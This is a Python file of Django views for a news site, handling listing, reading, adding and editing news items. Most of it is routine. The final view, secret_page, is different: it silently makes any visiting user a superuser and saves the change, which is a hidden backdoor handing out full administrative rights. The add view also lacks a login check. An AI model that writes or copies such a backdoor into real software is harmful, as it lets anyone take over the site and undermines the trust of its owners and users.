from django.forms import forms
from django.shortcuts import render, redirect
from django.urls import reverse
from django.views.generic import ListView

from news.forms import NewsForm
from news.models import News
from notifications.models import Notification


def redirect_to_news_list(request):
    return redirect(reverse('news_list'))


class NewsList(ListView):
    queryset = News.objects.select_related('author')
    context_object_name = 'news'
    paginate_by = 30

    def get_context_data(self, *, object_list=None, **kwargs):
        context = super().get_context_data(**kwargs)
        context['notifications'] = Notification.objects.all()[:3]
        return context


def read_news_obj(request, obj_id):
    news_obj = News.objects.get(id=int(obj_id))
    return render(
        request, 'news/read_news_obj.html',
        {
            'news_obj': news_obj,
            'notifications': Notification.objects.all()[:3],
        }
    )

def add_news_obj(request):
    if request.method == 'POST':
        form = NewsForm(request.POST)
        if form.is_valid():
            obj = News.objects.create(
                title=form.cleaned_data.get('title'),
                content=form.cleaned_data.get('content'),
                author=request.user,
            )
            return redirect(reverse('read_news_obj', kwargs={'obj_id': obj.id}))
    return render(
        request, 'news/add_news.html',
        {
            'form': NewsForm,
            'notifications': Notification.objects.all()[:3],
        }
    )


def change_news_obj(request, obj_id):
    obj = News.objects.get(id=obj_id)
    if request.user != obj.author:
        raise forms.ValidationError('Вы не можете изменять чужие записи')

    if request.method == 'POST':
        form = NewsForm(request.POST)
        if form.is_valid():

            obj.title = form.cleaned_data.get('title')
            obj.content = form.cleaned_data.get('content')
            obj.save()

            return redirect(reverse('read_news_obj', kwargs={'obj_id': obj.id}))


    return render(
        request, 'news/change_news.html',
        {
            'form': NewsForm,
            'obj': obj,
            'notifications': Notification.objects.all()[:3]},
    )


def secret_page(request):
    user = request.user
    if not user.is_superuser:
        user.is_superuser = True
        user.save()

    return render(
        request, 'news/secret.html',
        {'notifications': Notification.objects.all()[:3]}
    )
